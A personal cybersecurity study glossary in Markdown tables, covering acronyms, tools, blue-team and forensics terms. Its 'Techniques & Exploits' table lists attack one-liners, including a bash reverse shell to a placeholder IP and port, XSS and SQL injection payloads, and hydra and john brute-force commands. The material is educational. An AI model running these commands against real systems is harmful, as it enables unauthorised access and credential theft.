# 🧠 Cybersecurity Glossary

This is a living glossary of key cybersecurity terms, tools, acronyms, and techniques encountered during my learning journey.

---

## 🔡 General Concepts & Acronyms

| Term | Meaning | Notes |
|------|--------|-------|
| CIA Triad | Confidentiality, Integrity, Availability | Core security model |
| CVE | Common Vulnerabilities and Exposures | Publicly disclosed vulnerabilities |
| IOC | Indicator of Compromise | Signs of a breach (hashes, IPs) |
| TTP | Tactics, Techniques, Procedures | Used in threat intelligence |
| SSRF | Server-Side Request Forgery | Server fetches attacker-controlled URLs |
| XSS | Cross-Site Scripting | Client-side script injection |
| SQLi | SQL Injection | Attack input altering SQL queries |
| LFI | Local File Inclusion | Load local files via web inputs |
| RCE | Remote Code Execution | Execute code on remote target |
| OSINT | Open Source Intelligence | Collecting data from public sources |

---

## 🧰 Common Tools

| Tool | What It Does | Example Usage |
|------|--------------|---------------|
| nmap | Network scanner | `nmap -sV -p- 10.10.10.5` |
| gobuster | Directory brute-forcer | `gobuster dir -u URL -w wordlist` |
| Burp Suite | Web proxy/testing | Intercepts and modifies HTTP requests |
| Hydra | Brute force tool | `hydra -l admin -P rockyou.txt host ssh` |
| Wireshark | Packet analyzer | Analyze `.pcap` files |
| tcpdump | CLI packet capture | `tcpdump -i eth0 port 80` |
| john | Password cracker | `john --wordlist=rockyou.txt hash.txt` |
| hashcat | GPU password cracker | Very fast, custom rules |
| metasploit | Exploit framework | Automated exploitation |
| CyberChef | Data decoder/analyzer | Useful for CTFs |

---

## 🧨 Techniques & Exploits

| Technique | Summary | Command/Payload |
|----------|---------|-----------------|
| SUID Abuse | Escalation via SUID binaries | `find / -perm -4000 -type f` |
| PATH Hijacking | Fake binaries in PATH | Modify `$PATH`, add fake `ls` |
| Buffer Overflow | Overwrite memory via input | Use cyclic patterns, gdb |
| XSS | Inject JavaScript | `<script>alert(1)</script>` |
| SQLi | Inject SQL logic | `' OR 1=1 -- ` |
| Reverse Shell | Get shell on attacker box | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Port Forwarding | Expose internal ports | `ssh -L 8080:localhost:80 user@target` |

---

## 🛡️ Blue Team / SOC Terms

| Term | Meaning |
|------|--------|
| SIEM | Security Info & Event Management |
| Splunk | Log aggregation & search tool |
| Zeek | Network traffic analyzer |
| Suricata | IDS/IPS engine |
| Sysmon | Advanced Windows event logging |
| Event ID 4624 | Successful logon (Windows) |
| Indicator of Compromise (IOC) | Hash, IP, URL related to threat |

---

## 🔒 Web Security

| Term | Meaning |
|------|--------|
| OWASP Top 10 | Most common web vulnerabilities |
| CSRF | Cross-Site Request Forgery |
| IDOR | Insecure Direct Object Reference |
| Cookies | Session storage in browsers |
| JWT | JSON Web Tokens used in auth |

---

## 📚 Forensics

| Term | Meaning |
|------|--------|
| Volatility | Memory forensics framework |
| Autopsy | GUI tool for disk forensics |
| .pcap | Packet capture file format |
| Base64 | Common encoding scheme |
| exiftool | View metadata of files/images |

---

## 🐍 Python / Scripting Keywords

| Function | Purpose |
|----------|---------|
| `requests` | Make web requests |
| `socket` | Low-level networking |
| `os`, `subprocess` | Run system commands |
| `argparse` | CLI argument parsing |
| `re` | Regular expressions for parsing |

---

> 🧠 Tip: Keep this updated weekly and link to full notes where possible!
